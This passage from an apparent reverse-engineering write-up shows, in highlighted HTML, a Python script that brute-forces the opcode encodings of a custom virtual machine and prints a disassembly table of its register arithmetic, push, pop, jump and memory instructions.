class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x11</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; + &quot;</span> + reg_3 + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y</span></span><br><span class="line"><span class="comment"># case 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x01</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; + &quot;</span> + <span class="string">&quot;Y&quot;</span> + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x12</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; - &quot;</span> + reg_3 + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y</span></span><br><span class="line"><span class="comment"># case 2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x02</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; - &quot;</span> + <span class="string">&quot;Y&quot;</span> + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x13</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; * &quot;</span> + reg_3 + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y</span></span><br><span class="line"><span class="comment"># case 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x03</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; * &quot;</span> + <span class="string">&quot;Y&quot;</span> + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x14</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; / &quot;</span> + reg_3 + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y</span></span><br><span class="line"><span class="comment"># case 4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x04</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_2 + <span class="string">&quot; / &quot;</span> + <span class="string">&quot;Y&quot;</span> + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y Y</span></span><br><span class="line"><span class="comment"># case 5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0x5</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y Y : &quot;</span></span><br><span class="line">    out = machine_code + reg_1 + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + <span class="string">&quot;DATA[&quot;</span> + <span class="string">&quot;YY&quot;</span>+ <span class="string">&quot;])&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y Y</span></span><br><span class="line"><span class="comment"># case 6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0x6</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y Y : &quot;</span></span><br><span class="line">    out = machine_code + vm_type + <span class="string">&quot;(&quot;</span> + <span class="string">&quot;DATA[&quot;</span> + <span class="string">&quot;YY&quot;</span>+ <span class="string">&quot;])&quot;</span> + <span class="string">&quot; = &quot;</span> + vm_type + <span class="string">&quot;(&quot;</span> + reg_1 + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x17</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;push &quot;</span> + reg_1</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y</span></span><br><span class="line"><span class="comment"># case 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0x1f</span>) != <span class="number">0x07</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y : &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;push Y ; 这里的 Y 为8个字节的大小&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##############</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0x8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;pop &quot;</span> + reg_1</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X Y Y</span></span><br><span class="line"><span class="comment"># case 0x9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0x9</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y Y : &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;jmp YY&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X YY</span></span><br><span class="line"><span class="comment"># case 0xa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0xa</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span 